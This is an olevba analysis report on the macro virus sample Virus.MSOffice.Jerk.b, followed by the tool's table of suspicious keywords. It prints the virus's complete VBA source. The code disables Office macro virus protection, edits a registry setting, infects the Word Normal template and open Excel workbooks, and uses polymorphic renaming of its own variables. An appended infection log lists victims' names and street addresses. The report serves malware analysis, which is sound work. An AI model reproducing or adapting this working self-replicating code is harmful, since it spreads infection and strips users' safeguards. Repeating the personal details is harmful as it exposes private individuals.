olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Jerk.b-e8679e68555205bc7f985d78faf190f866ae6655
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Jerk.b-e8679e68555205bc7f985d78faf190f866ae6655 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' 03:52:49: 오후 - Monday, 8 Nov 1999
' 조병현
'

































Private Sub Workbook_Deactivate()
On Error Resume Next
Const JJSCLQOYY = 1, SPRQV = True, GWUNWRL = False, PWAODAHUPV = 0
Dim XOVGG, RATDE As String
Dim QJDYRTTFQPABTXO, QFWDYJTSW As Integer
Dim TLIFV As Boolean
RATDE = "ThisWorkbook"
XOVGG = Application.ThisWorkbook.VBProject.VBComponents.Item(JJSCLQOYY).codemodule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(JJSCLQOYY).codemodule.CountOfLines)
Call UWPTVQZQBH(XOVGG)
For QJDYRTTFQPABTXO = JJSCLQOYY To Application.Workbooks.Count
TLIFV = GWUNWRL
For QFWDYJTSW = JJSCLQOYY To Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Count
If Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Item(QFWDYJTSW).codemodule.CountOfLines = PWAODAHUPV Then
If Application.Workbooks.Item(QJDYRTTFQPABTXO).Path <> "" And Application.Workbooks.Item(QJDYRTTFQPABTXO).Saved = SPRQV And TLIFV = GWUNWRL Then TLIFV = SPRQV
Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Item(QFWDYJTSW).codemodule.InsertLines JJSCLQOYY, XOVGG
If Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Item(QFWDYJTSW).Name = RATDE Then
Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Item(QFWDYJTSW).codemodule.ReplaceLine JJSCLQOYY * 33, "Private Sub Workbook_Deactivate()"
Else
Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Item(QFWDYJTSW).codemodule.ReplaceLine JJSCLQOYY * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next QFWDYJTSW
If TLIFV = SPRQV Then Application.Workbooks.Item(QJDYRTTFQPABTXO).Save
Next QJDYRTTFQPABTXO
End Sub
Private Sub Document_Close()
On Error Resume Next
Const SPRQV = True, GWUNWRL = False, PWAODAHUPV = 0, JJSCLQOYY = 1, BBQYAYDHQDLAS = wdFormatDocument, JHVJWVLIWJL = wdFormatTemplate, GTOYNYL = ":"
Dim TLIFV, JCIOGLQ, KRFJRBSHCJK, YMDKDPYQSJM As Boolean
Dim SJMTIBIDBOZY, CKUWLVFNSN As Object
Dim JUDYXAATGQHODP, XOVGG As String
If Month(JJSCLQOYY * Now) > JJSCLQOYY * 2 + JJSCLQOYY * 3 And Day(JJSCLQOYY * Now) = 4 + JJSCLQOYY * 10 Then MsgBox "V guvax " & Application.UserName & " vf n ovt fghcvq wrex!", 0, "www.all.net"
Set SJMTIBIDBOZY = ActiveDocument.VBProject.VBComponents.Item(JJSCLQOYY)
Set CKUWLVFNSN = NormalTemplate.VBProject.VBComponents.Item(JJSCLQOYY)
Randomize
KRFJRBSHCJK = GWUNWRL
YMDKDPYQSJM = GWUNWRL
If SJMTIBIDBOZY.codemodule.CountOfLines <> PWAODAHUPV Then KRFJRBSHCJK = SPRQV
If CKUWLVFNSN.codemodule.CountOfLines <> PWAODAHUPV Then YMDKDPYQSJM = SPRQV
Options.VirusProtection = GWUNWRL
If (KRFJRBSHCJK = SPRQV Xor YMDKDPYQSJM = SPRQV) And (ActiveDocument.SaveFormat = BBQYAYDHQDLAS Or ActiveDocument.SaveFormat = JHVJWVLIWJL) Then
If KRFJRBSHCJK = SPRQV Then
JCIOGLQ = NormalTemplate.Saved
XOVGG = SJMTIBIDBOZY.codemodule.Lines(JJSCLQOYY, SJMTIBIDBOZY.codemodule.CountOfLines)
Call WJSEFKVJJAXOYH(XOVGG)
If Int(Rnd * 10 * JJSCLQOYY) = JJSCLQOYY * 7 Then Call WXBKXZLPIZXDIJ(XOVGG)
Call RZYEJOJ(XOVGG)
CKUWLVFNSN.codemodule.InsertLines JJSCLQOYY, XOVGG
If JCIOGLQ = SPRQV Then NormalTemplate.Save
End If
JUDYXAATGQHODP = Mid(ActiveDocument.FullName, 2, JJSCLQOYY)
If YMDKDPYQSJM = SPRQV And (JUDYXAATGQHODP = GTOYNYL Or ActiveDocument.Saved = GWUNWRL) Then
TLIFV = ActiveDocument.Saved
XOVGG = CKUWLVFNSN.codemodule.Lines(JJSCLQOYY, CKUWLVFNSN.codemodule.CountOfLines)
Call RZYEJOJ(XOVGG)
SJMTIBIDBOZY.codemodule.InsertLines JJSCLQOYY, XOVGG
If TLIFV = SPRQV Then ActiveDocument.Save
End If
End If
End Sub
Private Sub WXBKXZLPIZXDIJ(ByRef XOVGG As String)
On Error Resume Next
Const YFYLO = 48, GNINRCIJTGZJAS = 15, ZVSZYI = 5, BURWUC = 65, LNOJAASHJY = 90, JJSCLQOYY = 1, SPRQV = True, GWUNWRL = False
Dim XMQNYDYG, XVVPHPCETmp, RDFMJCLWLKEW, XVVPHPCE(JJSCLQOYY To YFYLO), XVVPHPCE2(JJSCLQOYY To YFYLO) As String
Dim QJDYRTTFQPABTXO, QFWDYJTSW, JSKYJ As Integer
Dim QOCQXBNSB As Boolean
XMQNYDYG = "XOVGG YFYLO XVVPHPCE XVVPHPCE2 RDFMJCLWLKEW QJDYRTTFQPABTXO QFWDYJTSW JSKYJ QOCQXBNSB WXBKXZLPIZXDIJ GNINRCIJTGZJAS ZVSZYI BURWUC LNOJAASHJY JJSCLQOYY XMQNYDYG XVVPHPCETmp TLIFV JCIOGLQ KRFJRBSHCJK YMDKDPYQSJM SJMTIBIDBOZY CKUWLVFNSN WJSEFKVJJAXOYH VODUOLTM HXLNFVNTH BKZVFFYA EGRDMONPL VODUOLTMTmp OFEBXELAYKTDUS IXRCGOQZVJPW JUDYXAATGQHODP SPRQV GWUNWRL PWAODAHUPV BBQYAYDHQDLAS JHVJWVLIWJL GVKBEKCBLBWPL TRDVPZE GTOYNYL SLXKDPOD HUWZTP RATDE UWPTVQZQBH RZYEJOJ LRGPOCBFUHXTHTT YQXDOHRTDNJ NQMHDECBCMRDRU"
Randomize
QFWDYJTSW = JJSCLQOYY
For QJDYRTTFQPABTXO = JJSCLQOYY To Len(XMQNYDYG)
If Mid(XMQNYDYG, QJDYRTTFQPABTXO, JJSCLQOYY) = " " Or QJDYRTTFQPABTXO = Len(XMQNYDYG) Then
If QJDYRTTFQPABTXO = Len(XMQNYDYG) Then XVVPHPCETmp = XVVPHPCETmp & Mid(XMQNYDYG, QJDYRTTFQPABTXO, JJSCLQOYY)
For JSKYJ = JJSCLQOYY To Int((GNINRCIJTGZJAS - ZVSZYI + JJSCLQOYY) * Rnd + ZVSZYI)
XVVPHPCE2(QFWDYJTSW) = XVVPHPCE2(QFWDYJTSW) & Chr(Int((LNOJAASHJY - BURWUC + JJSCLQOYY) * Rnd + BURWUC))
Next JSKYJ
XVVPHPCE(QFWDYJTSW) = XVVPHPCETmp
XVVPHPCETmp = ""
QFWDYJTSW = QFWDYJTSW + JJSCLQOYY
Else
XVVPHPCETmp = XVVPHPCETmp & Mid(XMQNYDYG, QJDYRTTFQPABTXO, JJSCLQOYY)
End If
Next QJDYRTTFQPABTXO
QOCQXBNSB = GWUNWRL
For QJDYRTTFQPABTXO = JJSCLQOYY To Len(XOVGG)
For QFWDYJTSW = JJSCLQOYY To YFYLO
If Mid(XOVGG, QJDYRTTFQPABTXO, Len(XVVPHPCE(QFWDYJTSW))) = XVVPHPCE(QFWDYJTSW) Then
RDFMJCLWLKEW = RDFMJCLWLKEW & XVVPHPCE2(QFWDYJTSW)
QJDYRTTFQPABTXO = QJDYRTTFQPABTXO + Len(XVVPHPCE(QFWDYJTSW)) - JJSCLQOYY
QOCQXBNSB = SPRQV
Exit For
End If
Next QFWDYJTSW
If QOCQXBNSB = GWUNWRL Then
RDFMJCLWLKEW = RDFMJCLWLKEW & Mid(XOVGG, QJDYRTTFQPABTXO, JJSCLQOYY)
Else
QOCQXBNSB = GWUNWRL
End If
Next QJDYRTTFQPABTXO
XOVGG = RDFMJCLWLKEW
End Sub
Private Sub WJSEFKVJJAXOYH(ByRef XOVGG As String)
On Error Resume Next
Const EGRDMONPL = "' ", JJSCLQOYY = 1
Const GVKBEKCBLBWPL = "hh:mm:ss: AMPM - ", TRDVPZE = "dddd, d mmm yyyy"
Dim VODUOLTMTmp, VODUOLTM, OFEBXELAYKTDUS, IXRCGOQZVJPW, HXLNFVNTH, BKZVFFYA As String
Dim QJDYRTTFQPABTXO As Integer
HXLNFVNTH = Chr(10 * JJSCLQOYY + 3)
VODUOLTM = Application.UserAddress
IXRCGOQZVJPW = Format(Time, GVKBEKCBLBWPL) & Format(Date, TRDVPZE)
BKZVFFYA = Chr(JJSCLQOYY * 10)
OFEBXELAYKTDUS = Application.UserName
For QJDYRTTFQPABTXO = JJSCLQOYY To Len(VODUOLTM)
If Mid(VODUOLTM, QJDYRTTFQPABTXO, JJSCLQOYY) <> HXLNFVNTH Then
If Mid(VODUOLTM, QJDYRTTFQPABTXO, JJSCLQOYY) <> BKZVFFYA Then
VODUOLTMTmp = VODUOLTMTmp & Mid(VODUOLTM, QJDYRTTFQPABTXO, JJSCLQOYY)
End If
Else
VODUOLTMTmp = VODUOLTMTmp & HXLNFVNTH & EGRDMONPL
End If
Next QJDYRTTFQPABTXO
XOVGG = XOVGG & HXLNFVNTH & EGRDMONPL & IXRCGOQZVJPW & HXLNFVNTH & EGRDMONPL & OFEBXELAYKTDUS & HXLNFVNTH & EGRDMONPL & VODUOLTM & HXLNFVNTH
End Sub
Private Sub RZYEJOJ(ByVal XOVGG As String)
On Error Resume Next
Dim NQMHDECBCMRDRU As Long
Dim SLXKDPOD As Object
Dim LRGPOCBFUHXTHTT, YQXDOHRTDNJ As String
LRGPOCBFUHXTHTT = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
NQMHDECBCMRDRU = &H0
YQXDOHRTDNJ = "Options6"
System.PrivateProfileString("", LRGPOCBFUHXTHTT, YQXDOHRTDNJ) = NQMHDECBCMRDRU
Set SLXKDPOD = GetObject(, "Excel.Application")
Const JJSCLQOYY = 1, PWAODAHUPV = 0
Dim RATDE As String
Dim QJDYRTTFQPABTXO, QFWDYJTSW As Integer
RATDE = "ThisWorkbook"
For QJDYRTTFQPABTXO = JJSCLQOYY To SLXKDPOD.Application.Workbooks.Count
For QFWDYJTSW = JJSCLQOYY To SLXKDPOD.Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Count
If SLXKDPOD.Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Item(QFWDYJTSW).codemodule.CountOfLines = PWAODAHUPV Then
SLXKDPOD.Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Item(QFWDYJTSW).codemodule.InsertLines JJSCLQOYY, XOVGG
If SLXKDPOD.Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Item(QFWDYJTSW).Name = RATDE Then
SLXKDPOD.Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Item(QFWDYJTSW).codemodule.ReplaceLine 33 * JJSCLQOYY, "Private Sub Workbook_Deactivate()"
Else
SLXKDPOD.Application.Workbooks.Item(QJDYRTTFQPABTXO).VBProject.VBComponents.Item(QFWDYJTSW).codemodule.ReplaceLine JJSCLQOYY * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next QFWDYJTSW
Next QJDYRTTFQPABTXO
Set SLXKDPOD = Nothing
End Sub
Private Sub UWPTVQZQBH(ByVal XOVGG As String)
On Error Resume Next
Const SPRQV = True, GWUNWRL = False, JJSCLQOYY = 1, PWAODAHUPV = 0
Dim HUWZTP As Object
Dim JCIOGLQ As Boolean
Set HUWZTP = GetObject(, "Word.Application")
If HUWZTP.NormalTemplate.VBProject.VBComponents.Item(JJSCLQOYY).codemodule.CountOfLines = PWAODAHUPV Then
JCIOGLQ = HUWZTP.NormalTemplate.Saved
HUWZTP.Options.VirusProtection = GWUNWRL
HUWZTP.NormalTemplate.VBProject.VBComponents.Item(JJSCLQOYY).codemodule.InsertLines JJSCLQOYY, XOVGG
If JCIOGLQ = SPRQV Then HUWZTP.NormalTemplate.Save
End If
Set HUWZTP = Nothing
End Sub

' 09:50:58:  - Saturday, 13 Apr 1997
' Fred Cohen
' fc@all.net

' 10:10:57: AM - Sunday, 21 Feb 1999
' Jeff Goldstein
'

' 01:16:33: PM - Monday, 1 Mar 1999
' Custis Colelman
'

' 04:34:58: PM - Monday, 8 Mar 1999
' Marc Benson
'

' 05:12:25: PM - Monday, 24 May 1999
' Caroline Hartsock
' Caroline M. Hartsock
3863 Rodman Street, N.W., #54
Washington, D.C.  20016

' 10:57:30: AM - Wednesday, 2 Jun 1999
' Mary A. Downs
' Tucker Flyer
1615 L Street, N.W.
Washington, D.C.  20036-5612

' 09:41:28: AM - Thursday, 3 Jun 1999
' Christy A. Tolbert
' Tucker, Flyer & Lewis
1615 L Street, N.W.
Washington, D.C.  20036-5610

' 02:21:55: PM - Tuesday, 8 Jun 1999
' Mary S. Calkins
' COVENANT UNITED METHODIST CHURCH
20301 Pleasant Ridge Drive
Montgomery Village, MD  20886

' 05:03:09: PM - Wednesday, 9 Jun 1999
' Carol B. Friend
'

' 06:16:12: PM - Friday, 11 Jun 1999
' Preferred Customer
'

' 07:27:45: PM - Wednesday, 23 Jun 1999
' Wayne G. Travell
' Tucker, Flyer & Lewis
1615 L Street, N.W.
Washington, D.C.  20036-5610

' 10:30:08: AM - Thursday, 24 Jun 1999
' Nicole E. Dysart
' Tucker Flyer, P.C.
1615 L Street, N.W.
Washington, D.C.  20036-5610

' 12:23:33: PM - Wednesday, 30 Jun 1999
' Jane L. Johansen
' Tucker Flyer
1615 L Street, N.W.
Washington, D.C.  20036-5612

' 06:43:55: PM - Tuesday, 6 Jul 1999
' Kendal Tyre
'

' 07:31:17: AM - Wednesday, 7 Jul 1999
' jlo
'

' 11:13:56: AM - Thursday, 8 Jul 1999
' Deborah Quinn
'

' 01:54:29: PM - Friday, 9 Jul 1999
' Library
'

' 05:54:56: PM - Monday, 12 Jul 1999
' Outlook
'

' 10:48:41: AM - Friday, 16 Jul 1999
' PSINet
'

' 03:18:33: PM - Monday, 2 Aug 1999
' PSINet
'

' 10:43:05: 오후 - Tuesday, 31 Aug 1999
' 조병현
'

' 08:35:53: 오후 - Wednesday, 3 Nov 1999
' 조병현
'

' 07:48:42: 오후 - Wednesday, 1 Dec 1999
' 김경민
'

' 10:16:09: 오전 - Wednesday, 26 Jan 2000
' 조병현
'

' 02:03:07: 오후 - Tuesday, 4 Jul 2000
' 허욱헌
'

' 05:11:11: 오후 - Wednesday, 26 Jul 2000
' YJ Shin
'

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

